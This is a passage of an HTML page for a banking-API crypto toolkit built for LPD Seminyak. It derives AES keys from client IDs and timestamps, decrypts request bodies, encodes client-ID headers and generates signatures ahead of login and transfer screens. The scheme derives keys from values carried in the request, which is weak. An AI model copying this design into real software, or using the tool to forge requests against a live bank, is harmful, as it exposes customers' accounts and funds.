.tab-bar{display:flex;gap:2px;border-bottom:1px solid #334155;margin-bottom:16px}
.tab{padding:8px 16px;font-size:12px;font-weight:600;color:#64748b;cursor:pointer;border-bottom:2px solid transparent;transition:all .15s}
.tab.active{color:#a78bfa;border-bottom-color:#7c3aed}
.tab-panel{display:none}.tab-panel.active{display:block}
.stat-row{display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid #1e293b;font-size:12px}
.stat-row:last-child{border-bottom:none}
.stat-key{color:#64748b;min-width:130px;font-family:monospace}
.stat-val{color:#a5f3fc;font-family:monospace;word-break:break-all}
.divider{height:1px;background:#1e293b;margin:16px 0}
.quick-ref{background:#020617;border:1px solid #1e293b;border-radius:8px;padding:12px;font-size:11px;font-family:monospace;color:#64748b;line-height:2}
.quick-ref .cmd{color:#a5f3fc}
.quick-ref .comment{color:#475569}
.badge-algo{display:inline-block;padding:2px 7px;border-radius:4px;font-size:10px;font-weight:700}
.badge-aes{background:#1e3a5f;color:#60a5fa}
.badge-hmac{background:#1c1200;color:#fcd34d}
.badge-rsa{background:#1e1b4b;color:#a78bfa}
.badge-sha{background:#022c22;color:#6ee7b7}
.nav-back{padding:10px 14px;border-top:1px solid #312e81;position:sticky;bottom:0;background:#1e1b4b}

/* \u2500\u2500 MOBILE HAMBURGER & OVERLAY \u2500\u2500 */
#menu-toggle{display:none;background:none;border:none;color:#a5b4fc;font-size:22px;cursor:pointer;padding:4px 8px;line-height:1}
#sidebar-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:99;backdrop-filter:blur(2px)}
#sidebar-overlay.show{display:block}

/* \u2500\u2500 TOPBAR RESPONSIVE \u2500\u2500 */
.topbar{flex-wrap:wrap;gap:8px}
.topbar-badges{display:flex;gap:6px;flex-wrap:wrap}

/* \u2500\u2500 BUTTON GROUPS \u2500\u2500 */
.btn-group{display:flex;gap:8px;flex-wrap:wrap;margin-top:4px}
.btn-group .btn{flex:1;min-width:120px;justify-content:center}

/* \u2500\u2500 SMART / TRANSAKSI \u2500\u2500 */
.session-box{background:#0c1a0c;border:1px solid #166534;border-radius:10px;padding:12px 16px;margin-bottom:16px}
.session-box .session-title{font-size:11px;font-weight:700;color:#4ade80;text-transform:uppercase;letter-spacing:.8px;margin-bottom:8px}
.session-field{display:flex;align-items:center;gap:8px;margin-bottom:4px;font-size:11px}
.session-field .sf-label{color:#6ee7b7;min-width:90px;font-family:monospace}
.session-field .sf-val{color:#a7f3d0;font-family:monospace;word-break:break-all;flex:1}
.session-field .sf-copy{background:none;border:1px solid #166534;color:#4ade80;border-radius:4px;padding:1px 7px;font-size:10px;cursor:pointer}
.badge-live{display:inline-flex;align-items:center;gap:5px;background:#052e16;border:1px solid #166534;color:#4ade80;font-size:10px;font-weight:700;padding:2px 9px;border-radius:999px}
.badge-live .dot{width:6px;height:6px;background:#4ade80;border-radius:50%;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.badge-offline{display:inline-flex;align-items:center;gap:5px;background:#1f1f1f;border:1px solid #374151;color:#6b7280;font-size:10px;font-weight:700;padding:2px 9px;border-radius:999px}
.step-indicator{display:flex;align-items:center;gap:0;margin-bottom:18px;flex-wrap:wrap;gap:4px}
.step{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;padding:5px 12px;border-radius:999px;background:#1e293b;color:#64748b;border:1px solid #334155}
.step.done{background:#052e16;color:#4ade80;border-color:#166534}
.step.active{background:#312e81;color:#a78bfa;border-color:#4c1d95}
.step-arrow{color:#334155;font-size:10px}
.amount-input{font-size:20px!important;font-weight:700!important;color:#fbbf24!important;text-align:right}
.confirm-box{background:#1c1200;border:1px solid #92400e;border-radius:10px;padding:14px;margin:12px 0}
.confirm-row{display:flex;justify-content:space-between;align-items:center;padding:5px 0;border-bottom:1px solid #292524;font-size:12px}
.confirm-row:last-child{border-bottom:none}
.confirm-label{color:#78716c}
.confirm-value{color:#fbbf24;font-weight:700;font-family:monospace}

/* \u2500\u2500 MOBILE BREAKPOINT \u2500\u2500 */
@media(max-width:768px){
  :root{--sidebar-w:280px}
  #sidebar{transform:translateX(-100%);transition:transform .25s ease;box-shadow:4px 0 20px rgba(0,0,0,.5)}
  #sidebar.open{transform:translateX(0)}
  #menu-toggle{display:inline-flex;align-items:center}
  #main{margin-left:0!important}
  .topbar{padding:10px 14px}
  .topbar h2{font-size:13px}
  .content{padding:14px 12px}
  .panel-body{padding:12px}
  .panel-header{padding:10px 14px}
  .grid-2,.grid-3{grid-template-columns:1fr!important}
  .topbar-badges span{font-size:9px;padding:2px 7px}
  pre.result{font-size:10.5px;max-height:280px}
  .stat-key{min-width:100px;font-size:11px}
  .stat-val{font-size:11px}
  .btn{padding:10px 14px;font-size:11px}
  .quick-ref{font-size:10px}
  textarea{min-height:70px}
}

@media(max-width:480px){
  .topbar h2 span.hide-xs{display:none}
  .btn-group .btn{min-width:100%;flex:1 1 100%}
  .tab{padding:7px 10px;font-size:11px}
  .info-box{font-size:11px}
  label{font-size:10px}
  input[type=text],input[type=number],textarea,select{font-size:12px;padding:8px 10px}
}
</style>
</head>
<body>

<div id="sidebar-overlay" onclick="closeSidebar()"></div>
<aside id="sidebar">
<div class="logo">
  <h1><i class="fas fa-lock mr-1"></i> LPD Crypto Toolkit</h1>
  <p>AES-256-CBC \xB7 RSA \xB7 HMAC-SHA512</p>
</div>
<nav>
  <div class="nav-section">Kunci &amp; Token</div>
  <a href="#" onclick="showTab('keygen');return false" id="nav-keygen" class="active"><i class="fas fa-key"></i> Derive AES Keys</a>
  <a href="#" onclick="showTab('timestamp');return false" id="nav-timestamp"><i class="fas fa-clock"></i> Timestamp Jakarta</a>
  <a href="#" onclick="showTab('reference');return false" id="nav-reference"><i class="fas fa-hashtag"></i> Generate X-REFERENCE</a>
  <div class="nav-section">Enkripsi &amp; Dekripsi</div>
  <a href="#" onclick="showTab('encrypt');return false" id="nav-encrypt"><i class="fas fa-lock"></i> AES Encrypt</a>
  <a href="#" onclick="showTab('decrypt');return false" id="nav-decrypt"><i class="fas fa-unlock"></i> AES Decrypt</a>
  <a href="#" onclick="showTab('decrypt-body');return false" id="nav-decrypt-body"><i class="fas fa-box-open"></i> Decrypt Request Body</a>
  <div class="nav-section">Header Decode/Encode</div>
  <a href="#" onclick="showTab('did-decode');return false" id="nav-did-decode"><i class="fas fa-id-card"></i> Decode X-CLIENT-ID</a>
  <a href="#" onclick="showTab('did-encode');return false" id="nav-did-encode"><i class="fas fa-id-badge"></i> Encode X-CLIENT-ID</a>
  <a href="#" onclick="showTab('jwt-decode');return false" id="nav-jwt-decode"><i class="fas fa-file-code"></i> Decode JWT</a>
  <a href="#" onclick="showTab('sig-decode');return false" id="nav-sig-decode"><i class="fas fa-signature"></i> Decode X-SIGNATURE</a>
  <div class="nav-section">Generate Signature</div>
  <a href="#" onclick="showTab('signature');return false" id="nav-signature"><i class="fas fa-pen-nib"></i> X-SIGNATURE / PARTNER-ID</a>
  <a href="#" onclick="showTab('ios-token-sig');return false" id="nav-ios-token-sig"><i class="fas fa-mobile-alt"></i> iOS Token Signature</a>
  <a href="#" onclick="showTab('snap-token-sig');return false" id="nav-snap-token-sig"><i class="fas fa-plug"></i> SNAP Token Signature</a>
  <div class="nav-section">Hash &amp; Builder</div>
  <a href="#" onclick="showTab('hashcode');return false" id="nav-hashcode"><i class="fas fa-fingerprint"></i> Hash Code Transfer</a>
  <a href="#" onclick="showTab('build-transfer');return false" id="nav-build-transfer"><i class="fas fa-hammer"></i> Build Transfer Request</a>
  <div class="nav-section">Referensi</div>
  <a href="#" onclick="showTab('quick-ref');return false" id="nav-quick-ref"><i class="fas fa-book"></i> Referensi Cepat</a>
  <div class="nav-section" style="color:#f59e0b">Transaksi</div>
  <a href="#" onclick="showTab('smart-login');return false" id="nav-smart-login"><i class="fas fa-sign-in-alt"></i> Login Nasabah</a>
  <a href="#" onclick="showTab('smart-saldo');return false" id="nav-smart-saldo"><i class="fas fa-wallet"></i> Cek Saldo</a>
  <a href="#" onclick="showTab('smart-transfer');return false" id="nav-smart-transfer"><i class="fas fa-exchange-alt"></i> Transfer</a>
</nav>
<div class="nav-back">
  <a href="/swagger" style="display:flex;align-items:center;gap:7px;font-size:11px;color:#6d28d9;text-decoration:none"><i class="fas fa-flask"></i> Buka API Explorer</a>
</div>
</aside>

<div id="main">
<div class="topbar">
  <div style="display:flex;align-items:center;gap:10px">
    <button id="menu-toggle" onclick="toggleSidebar()" aria-label="Menu"><i class="fas fa-bars"></i></button>
    <h2><i class="fas fa-lock" style="margin-right:6px"></i><span>LPD Seminyak</span> <span class="hide-xs">\u2014 Crypto Toolkit</span></h2>
  </div>
  <div class="topbar-badges">
    <span style="background:#312e81;color:#a5b4fc;font-size:10px;padding:3px 9px;border-radius:999px;font-weight:700">AES-256-CBC</span>
    <span style="background:#1c1200;color:#fcd34d;font-size:10px;padding:3px 9px;border-radius:999px;font-weight:700">HMAC-SHA512</span>
    <span style="background:#022c22;color:#6ee7b7;font-size:10px;padding:3px 9px;border-radius:999px;font-weight:700">RSA-SHA256</span>
  </div>
</div>

<div class="content">

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- DERIVE AES KEYS -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-keygen" class="section active">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-key" style="color:#a78bfa"></i>
    <h3>Derive AES Keys (Gio_CreateKeyAndIv)</h3>
    <span class="badge">HMAC-SHA512</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-purple">
      <i class="fas fa-info-circle"></i>
      <div>Menderivasi AES key, IV, dan CS dari <b>clientID</b> + <b>timestamp</b>. Replika tepat dari PHP <code>Gio_CreateKeyAndIv($clientID, $timeStamp)</code>. Digunakan pada saat registrasi perangkat baru (bukan DB lookup).</div>
    </div>
    <div class="grid-2">
      <div class="field-row">
        <label>Client ID</label>
        <input type="text" id="kg-clientid" placeholder="AQ3A.240912.001.01102025120205" value="AQ3A.240912.001.01102025120205"/>
      </div>
      <div class="field-row">
        <label>Timestamp (YYYY-MM-DD HH:MM:SS)</label>
        <input type="text" id="kg-ts" placeholder="2026-04-20 11:44:20" value="2026-04-20 11:44:20"/>
      </div>
    </div>
    <div class="btn-group">
      <button class="btn btn-primary" onclick="runOp(event,'keygen')"><i class="fas fa-play"></i> Derive Keys + Generate X-CLIENT-ID</button>
      <button class="btn btn-secondary" onclick="fillNow('kg-ts')"><i class="fas fa-clock"></i> Sekarang (Jakarta)</button>
    </div>
    <div id="result-keygen" class="result-box"></div>

    <!-- Auto X-CLIENT-ID result panel (muncul otomatis setelah keygen) -->
    <div id="kg-did-panel" style="display:none;margin-top:12px;border:1px solid #22c55e33;border-radius:8px;background:#0a1a0a;padding:14px">
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">
        <span style="color:#22c55e;font-size:13px;font-weight:700"><i class="fas fa-id-badge"></i> X-CLIENT-ID (Auto-Generated)</span>
        <span id="kg-did-badge" style="background:#14532d;color:#4ade80;font-size:10px;padding:2px 8px;border-radius:10px;font-weight:700">\u2705 SIAP</span>
      </div>
      <div style="display:flex;gap:6px;align-items:stretch">
        <textarea id="kg-did-output" readonly rows="3" style="flex:1;background:#0d0d0d;border:1px solid #1a3a1a;border-radius:6px;color:#4ade80;font-size:10px;font-family:monospace;padding:8px;resize:none;word-break:break-all"></textarea>
        <div style="display:flex;flex-direction:column;gap:6px">
          <button class="btn btn-secondary" style="font-size:10px;padding:6px 10px;white-space:nowrap" onclick="copyText(this,document.getElementById('kg-did-output').value)"><i class="fas fa-copy"></i> Salin</button>
          <button class="btn btn-primary" style="font-size:10px;padding:6px 10px;white-space:nowrap;background:linear-gradient(135deg,#d97706,#b45309)" onclick="showTab('smart-login')"><i class="fas fa-sign-in-alt"></i> Login</button>
        </div>
      </div>
      <div style="margin-top:8px;font-size:10px;color:#6b7280"><i class="fas fa-magic" style="color:#a78bfa"></i> X-CLIENT-ID di-encode otomatis dari clientID + timestamp yang sama. Form Login sudah diisi otomatis.</div>
    </div>

    <div class="divider"></div>
    <div class="info-box info-yellow">
      <i class="fas fa-info-circle"></i>
      <div><b>Cara kerja:</b> HMAC-SHA512(key=timestamp, msg=clientID) \u2192 64 bytes \u2192 slice ke-HH:MM:SS untuk dapat key/iv/cs. AES Key = 32 bytes, IV = 16 bytes, CS = 8 bytes. <b>X-CLIENT-ID di-encode otomatis</b> menggunakan clientID + timestamp yang sama.</div>
    </div>
    <div class="quick-ref">
      <span class="comment"># CLI:</span><br>
      <span class="cmd">node lpd-crypto.cjs keygen "AQ3A.240912.001.01102025120205" "2026-04-20 11:44:20"</span>
    </div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- TIMESTAMP -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-timestamp" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-clock" style="color:#a78bfa"></i>
    <h3>Timestamp Jakarta (WIB UTC+7)</h3>
    <span class="badge">Utility</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-green">
      <i class="fas fa-info-circle"></i>
      <div>Menghasilkan timestamp waktu Jakarta sekarang dalam dua format: <b>YYYY-MM-DD HH:MM:SS</b> (untuk iOS API) dan <b>ISO8601+07:00</b> (untuk SNAP API).</div>
    </div>
    <button class="btn btn-green" onclick="runOp(event,'timestamp')"><i class="fas fa-sync"></i> Get Timestamp Sekarang</button>
    <div id="result-timestamp" class="result-box"></div>
    <div class="divider"></div>
    <div class="quick-ref">
      <span class="comment"># Format iOS (gmob_request, X-TIMESTAMP field):</span><br>
      <span class="cmd">2026-04-20 11:44:20</span><br>
      <span class="comment"># Format SNAP (ISO8601 dengan offset):</span><br>
      <span class="cmd">2026-04-20T11:44:20+07:00</span>
    </div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- REFERENCE -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-reference" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-hashtag" style="color:#a78bfa"></i>
    <h3>Generate X-REFERENCE</h3>
    <span class="badge">Unique ID</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-purple">
      <i class="fas fa-info-circle"></i>
      <div>Generate nomor referensi unik format <b>SMYHHMMSSxxxxO1012YYYYMMDD</b>. Setiap request transfer membutuhkan X-REFERENCE yang belum pernah digunakan (status 45 = duplikat).</div>
    </div>
    <div class="grid-2">
      <div class="field-row">
        <label>Prefix (default: SMY)</label>
        <input type="text" id="ref-prefix" placeholder="SMY" value="SMY"/>
      </div>
      <div class="field-row">
        <label>Jumlah (1\u201310)</label>
        <input type="number" id="ref-count" placeholder="5" value="5" min="1" max="10"/>
      </div>
    </div>
    <button class="btn btn-primary" onclick="runOp(event,'reference')"><i class="fas fa-dice"></i> Generate References</button>
    <div id="result-reference" class="result-box"></div>
    <div class="divider"></div>
    <div class="info-box info-red">
      <i class="fas fa-exclamation-triangle"></i>
      <div><b>Penting:</b> Setiap X-REFERENCE hanya bisa digunakan SATU KALI per endpoint. Jika server mengembalikan status 45 ("No. referensi duplikat"), generate reference baru.</div>
    </div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- AES ENCRYPT -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-encrypt" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-lock" style="color:#a78bfa"></i>
    <h3>AES-256-CBC Encrypt (Gio_Encrypt)</h3>
    <span class="badge">AES-256-CBC</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-purple">
      <i class="fas fa-info-circle"></i>
      <div>Enkripsi plaintext dengan AES-256-CBC. Replika dari PHP <code>openssl_encrypt($plain,'AES-256-CBC',$key,OPENSSL_RAW_DATA,$iv)</code>. Gunakan key/iv dari hasil Derive AES Keys.</div>
    </div>
    <div class="field-row">
      <label>Plaintext</label>
      <input type="text" id="enc-plain" placeholder="1234567890"/>
    </div>
    <div class="grid-2">
      <div class="field-row">
        <label>AES Key (base64, 32 bytes)</label>
        <input type="text" id="enc-key" placeholder="6mFbbiR/yZ7y1O7pFHEDJ0lZOVJFalA8piKaZLrWcBg="/>
      </div>
      <div class="field-row">
        <label>AES IV (base64, 16 bytes)</label>
        <input type="text" id="enc-iv" placeholder="ZLrWcBiRrq+egQkyb8Pf0g=="/>
      </div>
    </div>
    <div class="btn-group">
      <button class="btn btn-primary" onclick="runOp(event,'encrypt')"><i class="fas fa-lock"></i> Encrypt</button>
      <button class="btn btn-secondary" onclick="pasteFromKeygen('enc-key','enc-iv')"><i class="fas fa-paste"></i> Paste dari Keygen</button>
    </div>
    <div id="result-encrypt" class="result-box"></div>
    <div class="divider"></div>
    <div class="quick-ref">
      <span class="comment"># CLI:</span><br>
      <span class="cmd">node lpd-crypto.cjs encrypt "plaintext" "&lt;aesKey_b64&gt;" "&lt;aesIv_b64&gt;"</span>
    </div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- AES DECRYPT -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-decrypt" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-unlock" style="color:#a78bfa"></i>
    <h3>AES-256-CBC Decrypt (Gio_Decrypt)</h3>
    <span class="badge">AES-256-CBC</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-purple">
      <i class="fas fa-info-circle"></i>
      <div>Dekripsi ciphertext base64 kembali ke plaintext. Replika dari PHP <code>openssl_decrypt(base64_decode($enc),'AES-256-CBC',$key,OPENSSL_RAW_DATA,$iv)</code>.</div>
    </div>
    <div class="field-row">
      <label>Ciphertext (base64)</label>
      <textarea id="dec-cipher" placeholder="RKtZRW+Abxp/HBPMeBzAMw=="></textarea>
    </div>
    <div class="grid-2">
      <div class="field-row">
        <label>AES Key (base64, 32 bytes)</label>
        <input type="text" id="dec-key" placeholder="6mFbbiR/yZ7y1O7pFHEDJ0lZOVJFalA8piKaZLrWcBg="/>
      </div>
      <div class="field-row">
        <label>AES IV (base64, 16 bytes)</label>
        <input type="text" id="dec-iv" placeholder="ZLrWcBiRrq+egQkyb8Pf0g=="/>
      </div>
    </div>
    <div class="btn-group">
      <button class="btn btn-orange" onclick="runOp(event,'decrypt')"><i class="fas fa-unlock"></i> Decrypt</button>
      <button class="btn btn-secondary" onclick="pasteFromKeygen('dec-key','dec-iv')"><i class="fas fa-paste"></i> Paste dari Keygen</button>
    </div>
    <div id="result-decrypt" class="result-box"></div>
    <div class="divider"></div>
    <div class="quick-ref">
      <span class="comment"># CLI:</span><br>
      <span class="cmd">node lpd-crypto.cjs decrypt "&lt;cipher_b64&gt;" "&lt;aesKey_b64&gt;" "&lt;aesIv_b64&gt;"</span>
    </div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- DECRYPT REQUEST BODY -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-decrypt-body" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-box-open" style="color:#a78bfa"></i>
    <h3>Decrypt Full Request Body</h3>
    <span class="badge">Batch Decrypt</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-yellow">
      <i class="fas fa-exclamation-triangle"></i>
      <div><b>Catatan:</b> Body field (from_acc, to_acc, dst) hanya bisa didekripsi jika AES key/IV-nya SAMA dengan yang digunakan saat enkripsi (dari DB atau Gio_CreateKeyAndIv). Data dari curl real membutuhkan AES key dari tabel gmob_nasabah di database.</div>
    </div>
    <div class="field-row">
      <label>Body JSON (field-field yang terenkripsi)</label>
      <textarea id="db-body" style="min-height:160px;font-size:11px" placeholder='{"from_acc":"5re0Z89b0k2cwoL+K1HeRQ==","to_acc":"AvYW9eJG...","amount":"rJTs...","date_time":"SRcf...","to_name":"q7fp...","hash_code":"3MNi...","remark":""}'></textarea>
    </div>
    <div class="grid-2">
      <div class="field-row">
        <label>AES Key (base64, 32 bytes)</label>
        <input type="text" id="db-key" placeholder="6mFbbiR/yZ7y1O7pFHEDJ0lZOVJFalA8piKaZLrWcBg="/>
      </div>
      <div class="field-row">
        <label>AES IV (base64, 16 bytes)</label>
        <input type="text" id="db-iv" placeholder="ZLrWcBiRrq+egQkyb8Pf0g=="/>
      </div>
    </div>
    <div class="btn-group">
      <button class="btn btn-orange" onclick="runOp(event,'decrypt-body')"><i class="fas fa-box-open"></i> Decrypt Body</button>
      <button class="btn btn-secondary" onclick="pasteFromKeygen('db-key','db-iv')"><i class="fas fa-paste"></i> Paste dari Keygen</button>
      <button class="btn btn-secondary" onclick="fillSampleBody()"><i class="fas fa-fill"></i> Contoh dari curl Real</button>
    </div>
    <div id="result-decrypt-body" class="result-box"></div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- DID DECODE -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-did-decode" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-id-card" style="color:#a78bfa"></i>
    <h3>Decode X-CLIENT-ID (Gio_DecryptDID)</h3>
    <span class="badge">DID</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-purple">
      <i class="fas fa-info-circle"></i>
      <div>Dekode header <b>X-CLIENT-ID</b> menjadi <code>app|clientID|timestamp</code>. Algoritma custom: ekstrak 3 segmen base64 dari posisi tersembunyi, decode, split oleh "|".</div>
    </div>
    <div class="field-row">
      <label>X-CLIENT-ID (encoded DID, biasanya 400\u2013600 karakter)</label>
      <textarea id="did-decode-val" style="min-height:100px;font-size:10px" placeholder="U01ZU2V6F3B7BWtV[M39ZkVGUk0wRXVNalF3T1RFeUxqQXdNUzR3TVRFd01qQXlOVEU2VtaW55YWt8..."></textarea>
    </div>
    <div class="btn-group">
      <button class="btn btn-primary" onclick="runOp(event,'did-decode')"><i class="fas fa-unlock-alt"></i> Decode DID</button>
      <button class="btn btn-secondary" onclick="fillSampleDID()"><i class="fas fa-fill"></i> Contoh DID Real</button>
    </div>
    <div id="result-did-decode" class="result-box"></div>
    <div class="divider"></div>
    <div class="quick-ref">
      <span class="comment"># CLI:</span><br>
      <span class="cmd">node lpd-crypto.cjs did "&lt;X-CLIENT-ID&gt;"</span>
    </div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- DID ENCODE -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-did-encode" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-id-badge" style="color:#a78bfa"></i>
    <h3>Encode X-CLIENT-ID (kebalikan DID)</h3>
    <span class="badge">DID Encode</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-green">
      <i class="fas fa-info-circle"></i>
